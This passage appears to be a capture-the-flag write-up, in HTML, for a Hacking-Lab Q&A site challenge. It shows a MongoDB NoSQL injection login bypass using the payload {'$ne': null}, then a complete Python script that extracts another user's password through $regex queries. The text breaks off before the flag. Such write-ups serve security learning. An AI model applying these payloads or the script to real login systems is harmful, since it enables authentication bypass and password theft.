        Check out this new Q&A site. They must be hiding something 
        but we don't know where to search.
      </p>
      <img src="img/home.png" width="800">
      <p>The site has two accessible sub-pages: a catalogue of questions and answers</p>
      <img src="img/questions.png" width="800">
      <p>and a login page</p>
      <img src="img/login.png" width="800">
      <p>
        Secret information might be in a number of places. 
        There might be unlisted, but accessible pages under questions, 
        or one could try SQL injection in the login form. No luck! 
      </p>
      <p>
        a first hint appears when looking for 
        <b>http://whale.hacking-lab.com:3371/robots.txt</b>: <br>
        <code>Maybe the_admin knows more about the flag</code><br>
        Following this lead, there is one question asked by the_admin:
      </p>
      <img src="img/question_nosql.png" width="800">
      <p>
        Oh dear, they are using NoSQL? No wonder normal SQL injection did not work!
        Some <a href="https://www.owasp.org/index.php/Testing_for_NoSQL_injection">background reading</a>
        shows that there are no universal attack vectors, because different types of NoSQL 
        databases use different syntax. Luckily, the search is narrowed a bit 
        by the answer to the_admin's question above.
      </p>
      <p>
        Because the injection material is usually structured, POST requests with JSON
        payload should be used, with<br>
        <code>Content-Type: application/json</code>.<br>
        After quite some searching, it turned out that the DB seems to be MongoDB. 
        The JSON payload
        <pre class="prettyprint lang-sh">
{
  "username": "the_admin",
  "password": {"$ne": null}
}</pre>
        worked and logged me in as the_admin. Hooray! I'm in! Riches beyond compare! 
        Now what?
      </p>
      <img src="img/the_admin.png" width="800">
      <p>
        The only visible difference is that a new question has appeared:
      </p>
      <img src="img/question_null.png" width="800">
      <p>
        So, apparently the flag is the password of another user, null. 
        And even an admin has no access to the passwords. Bummer. 
      </p>
      <p>
        To reconstruct the password of null, I used regex queries, testing 
        for each letter in turn. For example,
        <pre class="prettyprint lang-sh">
{
  "username": "null",
  "password": {"$regex": "^a.*"}
}</pre>
        tests whether the password starts withe the letter a. 
        A python script automates the process:
      </p>
      <pre class="prettyprint lang-py">
from requests import Session
import string

url = "http://whale.hacking-lab.com:3371/"
sess = Session()
headers = {
    "Referer": "http://whale.hacking-lab.com:3371/login",
    "Host": "whale.hacking-lab.com:3371",
    "Content-type": "application/json"
}
sess.headers.update(headers)

payload = {
    "username": "null",
    "password": {"$regex": None}
}

# Find alphabet of password
alphabet = []
for c in string.ascii_letters + string.digits + "_-":
    payload["password"]["$regex"] = c
    req = sess.post(url + 'login', json=payload)
    if req.status_code == 200:
        alphabet.append(c)
        print(c)
print(alphabet)

# alphabet = ['3', '6', '7', 'c', 'e', 'f', 'x', 'E', 'F', 'G', 'K', 'M', 'P', 'Q']
password = ""
found = True
while found:
    found = False
    for c in alphabet:
        payload["password"]["$regex"] = '^' + password + c
        req = sess.post(url + 'login', json=payload)
        if req.status_code == 200:
            print(password, c)
            password += c
            found = True
            break
print("Password = ", password)</pre>
      <p>
        To reduce the number of queries, the scrip first tests which letters appear 
        in the password. Once the alphabet has been established, the password is 
        successively built up by checking for responses with status code 200.
        The password and flag is<br>
